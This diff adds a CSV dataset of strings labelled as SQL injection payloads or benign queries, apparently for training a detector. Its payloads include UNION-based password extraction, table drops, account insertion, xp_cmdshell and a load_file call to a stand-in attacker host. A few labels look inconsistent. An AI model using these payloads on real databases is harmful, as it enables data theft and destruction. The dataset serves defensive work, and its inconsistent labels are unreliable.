@@ -1,0 +1,466 @@
+query,label
+"' UNION SELECT 1,2,3--",1
+UPDATE users SET email = 'newemail@test.com' WHERE id = 5,0
+SELECT * FROM posts WHERE author_id = 3 ORDER BY created_at DESC LIMIT 10,0
+' AND (SELECT 1 FROM users WHERE username='admin')='1'--,1
+' AND (SELECT COUNT(*) FROM users)>0--,1
+New York,0
+SELECT notes FROM log WHERE notes LIKE '%OR%',0
+'; exec xp_cmdshell('ping 127.0.0.1')--,1
+SELECT product_name FROM inventory WHERE warehouse_id = 2,0
+ProductSearch123,0
+"SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id",0
+1'||'1'='1,1
+john.doe@company.com,0
+' /*!UNION*/ SELECT 1--,1
+name=John OR name=Jane,0
+1 OR 1=1,1
+') OR 1=1--,1
+1',1
+"SELECT name, email FROM customers WHERE age > 18",0
+' oR '1'='1,1
+%27 OR %271%27=%271,1
+admin@company.org,0
+ProductSearch123,0
+"' AND updatexml(1,concat(0x7e,(SELECT database())),1)--",1
+ORDER BY 1--,1
+1 OR 'unusual'='unusual,1
+' OR '1'='1,1
+Hello World,0
+UPDATE users SET email = 'newemail@test.com' WHERE id = 5,0
+SELECT * FROM orders WHERE notes = 'Call before delivery -- urgent',0
+0x31 UNION SELECT 0x61646d696e--,1
+john.doe@company.com,0
+"' AND substring(username,1,1)='a'--",1
+active,0
+search_term_here,0
+"' UNION ALL SELECT NULL,NULL,NULL--",1
+filter_active,0
+"' AND extractvalue(1,concat(0x7e,(SELECT version())))--",1
+"1 UNION SELECT user(),database()--",1
+SELECT AVG(salary) FROM employees WHERE department = 'IT',0
+' AND (SELECT COUNT(*) FROM users)>0--,1
+SELECT * FROM users WHERE id = 1,0
+SELECT product_name FROM inventory WHERE warehouse_id = 2,0
+'; UPDATE users SET password='hacked' WHERE '1'='1'--,1
+' AND 1=2--,1
+' OR '1'='1,1
+x' AND email IS NULL; --,1
+2 UNION SELECT 1,1
+admin@company.org,0
+admin'--,1
+"' AND extractvalue(1,concat(0x7e,(SELECT version())))--",1
+SELECT product_name FROM inventory WHERE warehouse_id = 2,0
+'admin'/*,1
+search_term_here,0
+'; DROP TABLE users--,1
+1; SELECT SLEEP(5)--,1
+DELETE FROM sessions WHERE expire_time < NOW(),0
+page_number_2,0
+' AND (SELECT COUNT(*) FROM users)>0--,1
+SELECT * FROM users,1
+' AND load_file('//attacker.com/test')--,1
+filter_active,0
+sort_by_date,0
+test' OR 1--,1
+' UN/**/ION SE/**/LECT 1--,1
+SELECT * FROM transactions WHERE amount > 1000 AND status = 'completed',0
+2024-01-15,0
+page_number_2,0
+"'; INSERT INTO users VALUES('hacker','pass')--",1
+'; WAITFOR DELAY '0:0:5'--,1
+SELECT DISTINCT city FROM customers,0
+1;SELECT 1,1
+"SELECT e.name, d.dept_name FROM employees e LEFT JOIN departments d ON e.dept_id = d.id",0
+Hello World,0
+1 OR 'unusual'='unusual,1
+ProductSearch123,0
+1; SELECT * FROM users--,1
+'; UPDATE users SET password='hacked' WHERE '1'='1'--,1
+' UN/**/ION SE/**/LECT 1--,1
+' oR '1'='1,1
+' ORDER BY 1--,1
+1; SELECT SLEEP(5)--,1
+' AND (SELECT 1 FROM users WHERE username='admin')='1'--,1
+') OR ('1'='1,1
+1; SELECT * FROM users--,1
+SELECT AVG(salary) FROM employees WHERE department = 'IT',0
+1',1
+UPDATE orders SET status = 'shipped' WHERE order_id = 101,0
+' GROUP BY columnnames having 1=1--,1
+SELECT product_name FROM inventory WHERE warehouse_id = 2,0
+name=a' OR 'b'='b,1
+"SELECT year, SUM(revenue) FROM sales GROUP BY year HAVING SUM(revenue) > 10000",0
+admin'--,1
+john_doe,0
+SELECT * FROM transactions WHERE amount > 1000 AND status = 'completed',0
+"' UNION SELECT username, password FROM users--",1
+' ORDER BY 1--,1
+0x31 UNION SELECT 0x61646d696e--,1
+SELECT COUNT(*) FROM orders WHERE status = 'active',0
+"1 UNION SELECT user(),database()--",1
+New York,0
+SELECT * FROM docs WHERE text LIKE '%;%',0
+"' AND substring(username,1,1)='a'--",1
+name=a' OR 'b'='b,1
+SELECT id FROM items WHERE description LIKE '%it''s%',0
+"SELECT name, email FROM customers WHERE age > 18",0
+SELECT notes FROM log WHERE notes LIKE '%OR%',0
+smartphone,0
+SELECT * FROM users WHERE id = 1,0
+"' AND updatexml(1,concat(0x7e,(SELECT database())),1)--",1
+' OR 1=1--,1
+""" OR ""1""=""1",1
+') OR 1=1--,1
+SELECT * FROM users WHERE name = 'O''Brien',0
+name=a' OR 'b'='b,1
+"SELECT name, email FROM customers WHERE age > 18",0
+"SELECT name, email FROM customers WHERE age > 18",0
+' AND 1=1--,1
+x' AND email IS NULL; --,1
+' ORDER BY 1--,1
+' AND (SELECT 1 FROM users WHERE username='admin')='1'--,1
+SELECT * FROM appointments WHERE doctor_id = 9 AND date = '2024-03-15',0
+'; DROP TABLE users--,1
+SELECT * FROM transactions WHERE amount > 1000 AND status = 'completed',0
+'; exec xp_cmdshell('ping 127.0.0.1')--,1
+2 UNION SELECT 1,1
+'%20OR%20'1'%3D'1,1
+"' UNION SELECT username, password FROM users--",1
+SELECT * FROM products WHERE name LIKE 'laptop%' AND price BETWEEN 500 AND 1500,0
+1; SELECT * FROM users--,1
+"SELECT category, MAX(price), MIN(price) FROM products GROUP BY category",0
+SELECT * FROM docs WHERE text LIKE '%;%',0
+john.doe@company.com,0
+'; exec xp_cmdshell('ping 127.0.0.1')--,1
+"1 UNION SELECT table_name,NULL FROM information_schema.tables--",1
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
+id=1 OR id=2,1
+"SELECT year, SUM(revenue) FROM sales GROUP BY year HAVING SUM(revenue) > 10000",0
+' /*!UNION*/ SELECT 1--,1
+1 AND 1,1
+SELECT * FROM logs WHERE level = 'ERROR' ORDER BY timestamp DESC,0
+' UN/**/ION SE/**/LECT 1--,1
+'; exec xp_cmdshell('ping 127.0.0.1')--,1
+0x31 UNION SELECT 0x61646d696e--,1
+"SELECT year, SUM(revenue) FROM sales GROUP BY year HAVING SUM(revenue) > 10000",0
+New York,0
+SELECT * FROM logs WHERE level = 'ERROR' ORDER BY timestamp DESC,0
+page_number_2,0
+'; EXEC sp_executesql N'SELECT 1'--,1
+' oR '1'='1,1
+smartphone,0
+1; SELECT SLEEP(5)--,1
+' /*!UNION*/ SELECT 1--,1
+UPDATE users SET email = 'newemail@test.com' WHERE id = 5,0
+ORDER BY 1--,1
+' GROUP BY columnnames having 1=1--,1
+'admin'/*,1
+SELECT DISTINCT city FROM customers,0
+"1 UNION SELECT table_name,NULL FROM information_schema.tables--",1
+' AND (SELECT COUNT(*) FROM users)>0--,1
+sort_by_date,0
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
+admin@company.org,0
+filter_active,0
+' AND load_file('//attacker.com/test')--,1
+' /*!UNION*/ SELECT 1--,1
+UPDATE users SET email = 'newemail@test.com' WHERE id = 5,0
+' AND 1=2--,1
+' GROUP BY columnnames having 1=1--,1
+' OR ''=',1
+Hello World,0
+status=active OR status=pending,0
+2024-01-15,0
+1 OR 1=1,1
+admin' #,1
+' OR '1'='1,1
+1',1
+"SELECT department, COUNT(*) FROM employees GROUP BY department",0
+SELECT col FROM t WHERE name = 'drop table',0
+test' OR 1--,1
+"SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id",0
+status=active OR status=pending,0
+"SELECT category, MAX(price), MIN(price) FROM products GROUP BY category",0
+name=John OR name=Jane,0
+""" OR ""1""=""1",1
+' /*!UNION*/ SELECT 1--,1
+1 OR 'unusual'='unusual,1
+' AND (SELECT 1 FROM users WHERE username='admin')='1'--,1
+SELECT * FROM data WHERE value = '1=1',0
+SELECT * FROM products WHERE price > (SELECT AVG(price) FROM products),0
+1 AND 1,1
+admin@company.org,0
+SELECT col FROM t WHERE name = 'drop table',0
+SELECT * FROM test WHERE val = 'union',0
+smartphone,0
+"INSERT INTO orders (user_id, product_id) VALUES (42, 15)",0
+2024-01-15,0
+' AND load_file('//attacker.com/test')--,1
+SELECT * FROM products WHERE price > (SELECT AVG(price) FROM products),0
+id=1 OR id=2,1
+') OR ('1'='1,1
+2 UNION SELECT 1,1
+'%20OR%20'1'%3D'1,1
+"SELECT e.name, d.dept_name FROM employees e LEFT JOIN departments d ON e.dept_id = d.id",0
+"' AND extractvalue(1,concat(0x7e,(SELECT version())))--",1
+page_number_2,0
+SELECT * FROM docs WHERE text LIKE '%;%',0
+SELECT * FROM products WHERE name LIKE 'laptop%' AND price BETWEEN 500 AND 1500,0
+SELECT COUNT(*) FROM orders WHERE status = 'active',0
+'%20OR%20'1'%3D'1,1
+2024-01-15,0
+'; exec xp_cmdshell('ping 127.0.0.1')--,1
+sort_by_date,0
+"' UNION ALL SELECT NULL,NULL,NULL--",1
+1 OR 1=1,1
+"SELECT department, COUNT(*) FROM employees GROUP BY department",0
+"' UNION ALL SELECT NULL,NULL,NULL--",1
+x' AND email IS NULL; --,1
+1;SELECT 1,1
+category=Electronics AND price<500,0
+1 OR 1=1,1
+1 OR 1=1,1
+"' UNION SELECT 1,2,3--",1
+' AND load_file('//attacker.com/test')--,1
+1; SELECT * FROM users--,1
+1 AND 1,1
+SELECT * FROM users WHERE name = 'O''Brien',0
+active,0
+SELECT AVG(salary) FROM employees WHERE department = 'IT',0
+SELECT DISTINCT city FROM customers,0
+admin'--,1
+"'; INSERT INTO users VALUES('hacker','pass')--",1
+active,0
+' UN/**/ION SE/**/LECT 1--,1
+"'; INSERT INTO users VALUES('hacker','pass')--",1
+SELECT * FROM users WHERE id = 1,0
+active,0
+' OR 'unusual'='unusual,1
+"' UNION ALL SELECT NULL,NULL,NULL--",1
+SELECT col FROM t WHERE name = 'drop table',0
+' AND 1=2--,1
+UPDATE users SET email = 'newemail@test.com' WHERE id = 5,0
+status=active OR status=pending,0
+SELECT * FROM test WHERE val = 'union',0
+"INSERT INTO orders (user_id, product_id) VALUES (42, 15)",0
+1'||'1'='1,1
+john_doe,0
+UPDATE orders SET status = 'shipped' WHERE order_id = 101,0
+"SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id",0
+"SELECT category, MAX(price), MIN(price) FROM products GROUP BY category",0
+%27 OR %271%27=%271,1
+SELECT * FROM users WHERE name = 'O''Brien',0
+SELECT id FROM tokens WHERE token = 'abc123--',0
+'; WAITFOR DELAY '0:0:5'--,1
+"INSERT INTO users (name, email) VALUES ('John', 'john@email.com')",0
+'admin'/*,1
+New York,0
+%27 OR %271%27=%271,1
+' OR ''=',1
+SELECT * FROM users,1
+SELECT * FROM products WHERE price > (SELECT AVG(price) FROM products),0
+"SELECT year, SUM(revenue) FROM sales GROUP BY year HAVING SUM(revenue) > 10000",0
+"1 UNION SELECT table_name,NULL FROM information_schema.tables--",1
+1 OR 1=1,1
+SELECT * FROM logs WHERE level = 'ERROR' ORDER BY timestamp DESC,0
+"INSERT INTO users (name, email) VALUES ('John', 'john@email.com')",0
+"SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id",0
+admin'--,1
+test' OR 1--,1
+'%20OR%20'1'%3D'1,1
+x' AND email IS NULL; --,1
+SELECT * FROM products WHERE price > (SELECT AVG(price) FROM products),0
+"INSERT INTO users (name, email) VALUES ('John', 'john@email.com')",0
+' OR 1=1--,1
+SELECT id FROM tokens WHERE token = 'abc123--',0
+' OR 1=1--,1
+0x31 UNION SELECT 0x61646d696e--,1
+' OR '1'='1,1
+'; UPDATE users SET password='hacked' WHERE '1'='1'--,1
+SELECT DISTINCT city FROM customers,0
+search_term_here,0
+1; SELECT SLEEP(5)--,1
+DELETE FROM sessions WHERE expire_time < NOW(),0
+'; DROP TABLE users--,1
+"' UNION SELECT username, password FROM users--",1
+"SELECT year, SUM(revenue) FROM sales GROUP BY year HAVING SUM(revenue) > 10000",0
+SELECT * FROM products WHERE name LIKE 'laptop%' AND price BETWEEN 500 AND 1500,0
+' OR '1'='1,1
+"' AND substring(username,1,1)='a'--",1
+DELETE FROM sessions WHERE expire_time < NOW(),0
+SELECT * FROM test WHERE val = 'union',0
+UPDATE orders SET status = 'shipped' WHERE order_id = 101,0
+') OR 1=1--,1
+ORDER BY 1--,1
+UPDATE orders SET status = 'shipped' WHERE order_id = 101,0
+"'; INSERT INTO users VALUES('hacker','pass')--",1
+SELECT product_name FROM inventory WHERE warehouse_id = 2,0
+Hello World,0
+"' UNION SELECT 1,2,3--",1
+filter_active,0
+"' UNION SELECT username, password FROM users--",1
+id=1 OR id=2,1
+john_doe,0
+"SELECT * FROM users WHERE role IN ('admin','user')",0
+SELECT * FROM data WHERE value = '1=1',0
+"SELECT e.name, d.dept_name FROM employees e LEFT JOIN departments d ON e.dept_id = d.id",0
+smartphone,0
+1'||'1'='1,1
+'; DROP TABLE users--,1
+"INSERT INTO users (name, email) VALUES ('John', 'john@email.com')",0
+"' UNION ALL SELECT NULL,NULL,NULL--",1
+"SELECT e.name, d.dept_name FROM employees e LEFT JOIN departments d ON e.dept_id = d.id",0
+SELECT * FROM users,1
+SELECT COUNT(*) FROM orders WHERE status = 'active',0
+'admin'/*,1
+'; UPDATE users SET password='hacked' WHERE '1'='1'--,1
+') OR 1=1--,1
+"SELECT e.name, d.dept_name FROM employees e LEFT JOIN departments d ON e.dept_id = d.id",0
+SELECT notes FROM log WHERE notes LIKE '%OR%',0
+INSERT INTO messages VALUES ('he said --no--'),0
+' AND (SELECT 1 FROM users WHERE username='admin')='1'--,1
+' AND 1=1--,1
+x' AND email IS NULL; --,1
+'; WAITFOR DELAY '0:0:5'--,1
+"SELECT department, COUNT(*) FROM employees GROUP BY department",0
+john_doe,0
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
+SELECT * FROM products WHERE price > (SELECT AVG(price) FROM products),0
+SELECT AVG(salary) FROM employees WHERE department = 'IT',0
+' having 1=1--,1
+Hello World,0
+' having 1=1--,1
+2024-01-15,0
+ORDER BY 1--,1
+SELECT * FROM logs WHERE level = 'ERROR' ORDER BY timestamp DESC,0
+INSERT INTO messages VALUES ('he said --no--'),0
+'; WAITFOR DELAY '0:0:5'--,1
+SELECT id FROM tokens WHERE token = 'abc123--',0
+admin@company.org,0
+""" OR ""1""=""1",1
+' having 1=1--,1
+UPDATE orders SET status = 'shipped' WHERE order_id = 101,0
+admin' #,1
+SELECT * FROM posts WHERE author_id = 3 ORDER BY created_at DESC LIMIT 10,0
+smartphone,0
+filter_active,0
+SELECT * FROM transactions WHERE amount > 1000 AND status = 'completed',0
+SELECT * FROM posts WHERE author_id = 3 ORDER BY created_at DESC LIMIT 10,0
+"' AND updatexml(1,concat(0x7e,(SELECT database())),1)--",1
+""" OR ""1""=""1",1
+' AND 1=2--,1
+' OR 'unusual'='unusual,1
+"' UNION SELECT 1,2,3--",1
+"SELECT * FROM users WHERE role IN ('admin','user')",0
+'; UPDATE users SET password='hacked' WHERE '1'='1'--,1
+"' AND updatexml(1,concat(0x7e,(SELECT database())),1)--",1
+'; WAITFOR DELAY '0:0:5'--,1
+SELECT * FROM users WHERE id = 1,0
+"SELECT * FROM users WHERE role IN ('admin','user')",0
+DELETE FROM sessions WHERE expire_time < NOW(),0
+SELECT COUNT(*) FROM orders WHERE status = 'active',0
+SELECT * FROM orders WHERE notes = 'Call before delivery -- urgent',0
+1'||'1'='1,1
+SELECT * FROM users WHERE id = 1,0
+1;SELECT 1,1
+SELECT * FROM logs WHERE level = 'ERROR' ORDER BY timestamp DESC,0
+SELECT * FROM q WHERE q = 'sleep()',0
+"INSERT INTO orders (user_id, product_id) VALUES (42, 15)",0
+"' AND extractvalue(1,concat(0x7e,(SELECT version())))--",1
+page_number_2,0
+SELECT * FROM products WHERE name LIKE 'laptop%' AND price BETWEEN 500 AND 1500,0
+1 OR 'unusual'='unusual,1
+john.doe@company.com,0
+sort_by_date,0
+SELECT id FROM items WHERE description LIKE '%it''s%',0
+' AND 1=1--,1
+"INSERT INTO orders (user_id, product_id) VALUES (42, 15)",0
+' AND load_file('//attacker.com/test')--,1
+%27 OR %271%27=%271,1
+0x31 UNION SELECT 0x61646d696e--,1
+' OR 1=1--,1
+1; SELECT * FROM users--,1
+SELECT * FROM posts WHERE author_id = 3 ORDER BY created_at DESC LIMIT 10,0
+admin' #,1
+SELECT id FROM items WHERE description LIKE '%it''s%',0
+SELECT * FROM q WHERE q = 'sleep()',0
+"'; INSERT INTO users VALUES('hacker','pass')--",1
+SELECT * FROM q WHERE q = 'sleep()',0
+ProductSearch123,0
+"' AND updatexml(1,concat(0x7e,(SELECT database())),1)--",1
+1 OR 'unusual'='unusual,1
+search_term_here,0
+') OR ('1'='1,1
+'admin'/*,1
+SELECT * FROM posts WHERE author_id = 3 ORDER BY created_at DESC LIMIT 10,0
+1'||'1'='1,1
+john_doe,0
+'%20OR%20'1'%3D'1,1
+"SELECT name, email FROM customers WHERE age > 18",0
+"SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id",0
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
+SELECT COUNT(*) FROM orders WHERE status = 'active',0
+"' UNION SELECT username, password FROM users--",1
+""" OR ""1""=""1",1
+') OR ('1'='1,1
+SELECT * FROM appointments WHERE doctor_id = 9 AND date = '2024-03-15',0
+' OR 'unusual'='unusual,1
+search_term_here,0
+1 OR 1=1,1
+' GROUP BY columnnames having 1=1--,1
+SELECT * FROM appointments WHERE doctor_id = 9 AND date = '2024-03-15',0
+' AND 1=1--,1
+') OR ('1'='1,1
+1; SELECT SLEEP(5)--,1
+' oR '1'='1,1
+category=Electronics AND price<500,0
+INSERT INTO messages VALUES ('he said --no--'),0
+"1 UNION SELECT user(),database()--",1
+DELETE FROM sessions WHERE expire_time < NOW(),0
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1
+"1 UNION SELECT table_name,NULL FROM information_schema.tables--",1
+name=John OR name=Jane,0
+ORDER BY 1--,1
+SELECT * FROM orders WHERE notes = 'Call before delivery -- urgent',0
+"SELECT department, COUNT(*) FROM employees GROUP BY department",0
+"' UNION SELECT 1,2,3--",1
+"SELECT category, MAX(price), MIN(price) FROM products GROUP BY category",0
+"INSERT INTO users (name, email) VALUES ('John', 'john@email.com')",0
+' OR 1=1--,1
+SELECT * FROM appointments WHERE doctor_id = 9 AND date = '2024-03-15',0
+1 OR 1=1,1
+New York,0
+'; EXEC sp_executesql N'SELECT 1'--,1
+') OR 1=1--,1
+'; EXEC sp_executesql N'SELECT 1'--,1
+SELECT * FROM data WHERE value = '1=1',0
+SELECT * FROM transactions WHERE amount > 1000 AND status = 'completed',0
+ProductSearch123,0
+john.doe@company.com,0
+%27 OR %271%27=%271,1
+"SELECT department, COUNT(*) FROM employees GROUP BY department",0
+' AND (SELECT COUNT(*) FROM users)>0--,1
+"INSERT INTO orders (user_id, product_id) VALUES (42, 15)",0
+SELECT DISTINCT city FROM customers,0
+"1 UNION SELECT table_name,NULL FROM information_schema.tables--",1
+"' AND substring(username,1,1)='a'--",1
+"' AND extractvalue(1,concat(0x7e,(SELECT version())))--",1
+' GROUP BY columnnames having 1=1--,1
+' AND 1=1--,1
+' OR ''=',1
+active,0
+admin'--,1
+sort_by_date,0
+category=Electronics AND price<500,0
+SELECT * FROM products WHERE name LIKE 'laptop%' AND price BETWEEN 500 AND 1500,0
+"1 UNION SELECT user(),database()--",1
+"SELECT category, MAX(price), MIN(price) FROM products GROUP BY category",0
+"' AND substring(username,1,1)='a'--",1
+' oR '1'='1,1
+'; DROP TABLE users--,1
+' UN/**/ION SE/**/LECT 1--,1
+SELECT * FROM appointments WHERE doctor_id = 9 AND date = '2024-03-15',0
+"1 UNION SELECT user(),database()--",1
+' AND 1=2--,1
+SELECT AVG(salary) FROM employees WHERE department = 'IT',0
